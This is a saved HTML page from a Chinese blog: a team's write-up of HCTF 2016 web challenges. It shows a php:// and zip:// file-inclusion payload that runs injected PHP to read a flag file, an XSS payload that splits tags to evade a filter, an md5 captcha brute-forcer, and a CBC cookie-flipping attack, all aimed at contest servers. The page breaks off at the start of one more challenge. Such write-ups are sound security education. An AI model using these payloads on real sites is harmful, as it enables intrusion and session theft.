@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport"/>
+<title>HCTF2016|Web|WP – Wupco's Blog</title>
+<script src="./HCTF2016WebWP – Wupco's Blog/jquery.jsver=1.12.4" type="text/javascript"></script>
+<script src="./HCTF2016WebWP – Wupco's Blog/jquery-migrate.min.jsver=1.4.1" type="text/javascript"></script>
+<link href="./HCTF2016WebWP – Wupco's Blog/rest_route=" rel="https://api.w.org/"/>
+<link href="http://www.wupco.cn/xmlrpc.php?rsd" rel="EditURI" title="RSD" type="application/rsd+xml"/>
+<link href="./HCTF2016WebWP – Wupco's Blog/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
+<link href="./HCTF2016WebWP – Wupco's Blog/p=93" rel="prev" title="整理思维——等于等于等于？{MySQL条件等号的异常}"/>
+<link href="./HCTF2016WebWP – Wupco's Blog/p=323" rel="next" title="SQLMAP|阅读手记一{从sqlmap.py开始到参数分析}"/>
+<link href="./HCTF2016WebWP – Wupco's Blog/p=106" rel="canonical"/>
+<link href="./HCTF2016WebWP – Wupco's Blog/p=106" rel="shortlink"/>
+<script src="./HCTF2016WebWP – Wupco's Blog/shCore.js" type="text/javascript"></script><link href=" http://www.wupco.cn/wp-content/plugins/wp-ueditor2/ueditor/third-party/SyntaxHighlighter/shCoreDefault.css" rel="stylesheet" type="text/css"/><link href="./HCTF2016WebWP – Wupco's Blog/R5K8RH7ACHA7KEV8P.gif" rel="icon" sizes="32x32"/>
+<link href="./HCTF2016WebWP – Wupco's Blog/R5K8RH7ACHA7KEV8P.gif" rel="icon" sizes="192x192"/>
+<link href="./HCTF2016WebWP – Wupco's Blog/R5K8RH7ACHA7KEV8P.gif" rel="apple-touch-icon-precomposed"/>
+<meta content="http://www.wupco.cn/wp-content/uploads/2016/11/R5K8RH7ACHA7KEV8P.gif" name="msapplication-TileImage">
+<link href="./HCTF2016WebWP – Wupco's Blog/favicon.png" rel="shortcut icon" type="image/vnd.microsoft.icon"/>
+<link href="./HCTF2016WebWP – Wupco's Blog/style.css" rel="stylesheet" type="text/css">
+<!--[if lt IE 9]>
+<script src="//cdn.bootcss.com/html5shiv/r29/html5.min.js"></script>
+<script src="//cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
+</link></meta></head>
+<body>
+<div class="container" id="main">
+<div class="pjax">
+<header id="header">
+<div class="container">
+<h1 class="logo">
+<i class="iconfont"></i><a href="http://www.wupco.cn">Wupco's Blog</a>
+</h1>
+<nav class="menu_click" id="topMenu">
+<div class="menu-menu-1-container"><ul class="menu" id="menu-menu-1"><li><a href="http://www.wupco.cn/">首页</a></li>
+<li><a href="http://www.wupco.cn/?page_id=1174">关于我</a></li>
+<li><a href="http://www.wupco.cn/?page_id=1448">数据备份</a></li>
+<li><a href="http://www.wupco.cn/?page_id=1959">CTF备忘录</a></li>
+</ul></div><i class="i_1"></i>
+<i class="i_2"></i>
+</nav>
+</div>
+</header>
+<section class="blockGroup">
+<h2 class="s_title" itemprop="name headline">HCTF2016|Web|WP</h2>
+<article class="post single" itemscope="" itemtype="http://schema.org/BlogPosting">
+<p style="text-align: left; text-indent: 2em;">  这次HCTF应该是我从开始学习Web安全这一年的一次阶段性考试了，感谢俊杰师傅和janes师傅的陪伴，也感谢Hazzel师傅这一年的教导。<br style="text-align: left; text-indent: 2em;"/></p>
+<p style="text-align: left; text-indent: 2em;">  贴一下终榜，虽然只有第八，但是确是一个很好的开始。</p>
+<p style="text-align: left; text-indent: 2em;">  <img src="./HCTF2016WebWP – Wupco's Blog/2931480318653.png"/></p>
+<p style="text-align: left;"><br style="text-indent: 2em; text-align: left;"/></p>
+<p style="text-align: left; text-indent: 2em;">====================================================================================</p>
+<p style="text-align: left; text-indent: 2em;"><span id="docs-internal-guid-5beb8de3-a9e0-a75f-55d0-7b62089f11d3"></span></p>
+<h1 dir="ltr" style="line-height:1.38;margin-top:24pt;margin-bottom:6pt;"><span style='font-size: 24px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>题目</span></h1>
+<h2 dir="ltr" style="line-height:1.38;margin-top:10pt;margin-bottom:0pt;"><span style='font-size: 32px; font-family: "Trebuchet MS"; vertical-align: baseline; white-space: pre-wrap;'>WEB</span></h2>
+<h3 dir="ltr" style="line-height:1.38;margin-top:14pt;margin-bottom:4pt;"><span style='vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei"; font-size: 18px;'>2099年的flag| solved | working: xiaojunjie, janes,wupco</span></h3>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>历代OS agent :</span><a href="http://www.wufangbo.com/useragent/" style='font-size: 14.6667px; color: rgb(17, 85, 204); text-decoration: underline; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'><span style='font-size: 14.6667px; color: rgb(17, 85, 204); text-decoration: underline; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>http://www.wufangbo.com/useragent/</span></a></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>把版本改成 99，POST hint=a</span></p>
+<pre class="brush:xml;toolbar:false">User-Agent:Mozilla/5.0 (iPhone; CPU iPhone OS 99_0 like Mac OS X) AppleWebKit/
+536.26 (KHTML, like Gecko) Version/99.0 Mobile/10A403 Safari/8536.25</pre>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; white-space: pre-wrap; text-indent: 2em; font-family: 微软雅黑, "Microsoft YaHei";'>flag:hctf{h77p_He4dEr_50_E4sy}<br/></span></p>
+<h3 dir="ltr" style="line-height:1.38;margin-top:14pt;margin-bottom:4pt;"><span style='vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei"; font-size: 18px;'>兵者多诡| solved | working: xiaojunjie</span></h3>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="193" src="./HCTF2016WebWP – Wupco's Blog/2-2.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="2.png" width="593"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>文件包含</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><a href="http://pics.hctf.io/home.php?fp=php://filter/convert.base64-encode/resource=home" style='font-size: 14.6667px; color: rgb(17, 85, 204); text-decoration: underline; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'><span style='font-size: 14.6667px; color: rgb(17, 85, 204); text-decoration: underline; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>http://pics.hctf.io/home.php?fp=php://filter/convert.base64-encode/resource=home</span></a></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="580" src="./HCTF2016WebWP – Wupco's Blog/3-1.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="3.png" width="602"/></span></p>
+<pre class="brush:xml;toolbar:false">http://pics.hctf.io/home.php
+?fp=zip://uploads/fe5e1c43e6e6bcfd506f0307e8ed6ec7ecc3821d.png%231
+post
+xiaojunjie=echo base64_encode(file_get_contents("../Th1s_1s_F1a9.php"));echo 1;</pre>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'><a _src="http://www.admintony.top/?p=1027" href="http://www.admintony.top/?p=1027">http://www.admintony.top/?p=1027</a></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'> </span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="363" src="./HCTF2016WebWP – Wupco's Blog/4-3.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="4.png" width="602"/></span></p>
+<h3 dir="ltr" style="line-height:1.38;margin-top:16pt;margin-bottom:4pt;"><span style='font-family: 微软雅黑, "Microsoft YaHei";'><span style="font-size: 18.6667px; color: rgb(67, 67, 67); font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">RESTFUL | </span><span style="font-size: 17.3333px; color: rgb(67, 67, 67); font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">solved</span><span style="font-size: 18.6667px; color: rgb(67, 67, 67); font-weight: 400; vertical-align: baseline; white-space: pre-wrap;"> | working :janes,wupco</span></span></h3>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>先按照提示把协议改成put</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="147" src="./HCTF2016WebWP – Wupco's Blog/5-1.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="5.png" width="602"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>然后把flag改成money</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>然后提示要大于12450,了解到这个框架直接通过 路由规则传参，于是如下</span></p>
+<pre class="brush:xml;toolbar:false">PUT /index.php/money/12451 HTTP/1.1
+Host: jinja.hctf.io
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
+Accept: */*
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Referer: http://jinja.hctf.io/
+Connection: keep-alive
+Content-Length: 5</pre>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>flag:hctf{Do_you_know_12450?}</span></p>
+<h3 dir="ltr" style="line-height:1.38;margin-top:16pt;margin-bottom:4pt;"><span style="font-size: 18px; font-family: Arial; color: rgb(67, 67, 67); font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">giligili | solved | working:janes,wupco</span></h3>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><a href="http://ideone.com/w2rake" style='font-size: 14.6667px; color: rgb(17, 85, 204); text-decoration: underline; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'><span style='font-size: 14.6667px; color: rgb(17, 85, 204); text-decoration: underline; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>http://ideone.com/w2rake</span></a><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'> 找到原题</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><a href="http://lorexxar.cn/2016/04/11/sctf-Obfusion/" style='font-size: 14.6667px; color: rgb(17, 85, 204); text-decoration: underline; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'><span style='font-size: 14.6667px; color: rgb(17, 85, 204); text-decoration: underline; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>http://lorexxar.cn/2016/04/11/sctf-Obfusion/</span></a><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'> wp</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="65" src="./HCTF2016WebWP – Wupco's Blog/6-1.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="6.png" width="180"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="134" src="./HCTF2016WebWP – Wupco's Blog/7-1.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="7.png" width="387"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="186" src="./HCTF2016WebWP – Wupco's Blog/8-1.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="8.png" width="546"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>e=<img height="31" src="./HCTF2016WebWP – Wupco's Blog/9.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="9.png" width="602"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>786024801 （随机数）</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>l是随机数？？</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>o被_分割的flag数组</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>i 恒等于 -761315766</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>s = ["0x" + 381f4862, "0x" + e['toString'](0o20).split("-")[1]]; </span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>e=-48879197(-0x2e9d65d)  e2=-941564184(-0x381f2118)  s[1]=0x3a9b9622   s[1]和输入的异或为0x3af6f74b  输入为0x6d6169</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>y：1,2,4</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>o[0]是前五位以后的，也就是hctf{后的，o[3]是从第三个下划线之后到}的</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>u:31251000</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>h 6e33</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>o[3].charCodeAt(1) * o[0].charCodeAt(0) == 0x2ef3  =‘w’ * ’e’</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; text-decoration: line-through; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>/*o[3].charCodeAt(1)  = <img height="107" src="./HCTF2016WebWP – Wupco's Blog/10.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="10.png" width="213"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; text-decoration: line-through; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>除不尽？？*/（这里思考错了，是neee3eeed?形式）</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>flag: hctf{wh3r3_iz_y0ur_neee3eeed??}</span></p>
+<h3 dir="ltr" style="line-height:1.38;margin-top:16pt;margin-bottom:4pt;"><span style='font-size: 18.6667px; color: rgb(67, 67, 67); font-weight: 400; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>guestbook|solved|working:wupco</span></h3>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>验证码破解脚本:</span></p>
+<pre class="brush:python;toolbar:false">import multiprocessing
+from os import urandom
+from hashlib import md5
+import sys
+def work(cipher):
+    for i in range(100):
+        plain = urandom(16).encode('hex')
+        if md5(plain).hexdigest()[:4] == cipher:
+            print plain
+            sys.exit(0)
+if __name__ == '__main__':
+    cipher = raw_input('md5:')
+    print multiprocessing.cpu_count()
+    pool = multiprocessing.Pool(processes=2)
+    while True:
+        plain = urandom(16).encode('hex')
+        pool.apply_async(work, (cipher, ))
+    pool.close()
+    pool.join()</pre>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-family: Arial; color: rgb(0, 0, 255); vertical-align: baseline; white-space: pre-wrap;"></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"> payload:</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-family: Arial; color: rgb(255, 0, 0); vertical-align: baseline; white-space: pre-wrap;">  </span></p>
+<pre class="brush:xml;toolbar:false">message=f'wupco&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;scrimgipt&gt;var s=document.createElement("liimgnk");
+document.getElementsByTagName("body")[0].appendChild(s);
+s.rel="prefetch";
+s.href=" 
+&lt;/scrimgipt&gt;&lt;li&gt;</pre>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-family: Arial; color: rgb(255, 0, 0); vertical-align: baseline; white-space: pre-wrap;"></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="123" src="./HCTF2016WebWP – Wupco's Blog/37.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="37.png" width="501"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="224" src="./HCTF2016WebWP – Wupco's Blog/11.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="11.png" width="602"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><br/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-family: Arial; vertical-align: baseline; white-space: pre-wrap;">flag: hctf{c5p_1s_g0od7h1ng2333}</span></p>
+<h3 dir="ltr" style="line-height:1.38;margin-top:16pt;margin-bottom:4pt;"><span style='font-size: 18.6667px; color: rgb(67, 67, 67); font-weight: 400; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>跑的比谁都快|solved|working:wupco, janes</span></h3>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><a href="http://changelog.hctf.io/README.md" style='color: rgb(17, 85, 204); text-decoration: underline; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei"; font-size: 14px;'><span style='color: rgb(17, 85, 204); text-decoration: underline; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei"; font-size: 14px;'>http://changelog.hctf.io/README.md</span></a></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei"; font-size: 14px;'># 跑得比谁都快<br class="kix-line-break"/><br class="kix-line-break"/>## ChangeLog 的故事<br class="kix-line-break"/>## 这里是加了.git之后忘删的README.md  XD by Aklis<br class="kix-line-break"/><br class="kix-line-break"/>## ChangeLog<br class="kix-line-break"/><br class="kix-line-break"/>- 2016.11.11<br class="kix-line-break"/>完成登陆功能，登陆之后在session将用户名和用户等级放到会话信息里面。<br class="kix-line-break"/>判断sessioin['level']是否能在index.php查看管理员才能看到的**东西**。<br class="kix-line-break"/>XD<br class="kix-line-break"/><br class="kix-line-break"/>- 2016.11.10<br class="kix-line-break"/>老板说注册成功的用户不能是管理员，我再写多一句把权限降为普通用户好啰。<br class="kix-line-break"/><br class="kix-line-break"/>- 2016.10<br class="kix-line-break"/>我把注册功能写好了</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei"; font-size: 14px;'>.思路</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei"; font-size: 14px;'> 1.在降权前登陆 ---</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="49" src="./HCTF2016WebWP – Wupco's Blog/12.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="12.png" width="401"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="525" src="./HCTF2016WebWP – Wupco's Blog/13.jpg" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="13.png" width="602"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="753" src="./HCTF2016WebWP – Wupco's Blog/14.jpg" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="14.png" width="602"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei"; font-size: 14px;'>Hello, 4afe997a3d563656This is your flag: hctf{faster_than_everyone}</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"> </span></p>
+<h3 dir="ltr" style="line-height:1.38;margin-top:16pt;margin-bottom:4pt;"><span style='font-size: 18.6667px; color: rgb(67, 67, 67); font-weight: 400; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>library|solved|working:wupco, janes,xiaojunjie</span></h3>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>发现git目录</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="202" src="./HCTF2016WebWP – Wupco's Blog/15.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="15.png" width="223"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>没有发现flag文件</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>应该是审计...</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>尝试恢复拿源码, 可以拿源码</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="415" src="./HCTF2016WebWP – Wupco's Blog/16.jpg" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="16.png" width="602"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; white-space: pre-wrap; font-family: Arial;">通过cbc翻转，攻击cookie<br/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>cookie username：HFs46VF4Sl9CD8tRNofE6ZVwLs_Gc5VTfTuoxLTXRtg</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="643" src="./HCTF2016WebWP – Wupco's Blog/17.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="17.png" width="519"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style="font-size: 14.6667px; font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"><img height="361" src="./HCTF2016WebWP – Wupco's Blog/18.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="18.png" width="543"/></span></p>
+<h3 dir="ltr" style="line-height:1.38;margin-top:16pt;margin-bottom:4pt;"><span style='font-size: 18.6667px; color: rgb(67, 67, 67); font-weight: 400; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>神秘的聊天板|solved|working:wupco</span></h3>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>80%又是一个XSS</span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><a href="http://sguestbook.hctf.io/static/redirect.php" style='font-size: 14.6667px; color: rgb(17, 85, 204); text-decoration: underline; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'><span style='font-size: 14.6667px; color: rgb(17, 85, 204); text-decoration: underline; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>http://sguestbook.hctf.io/static/redirect.php</span></a><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>?u=/index.php  </span></p>
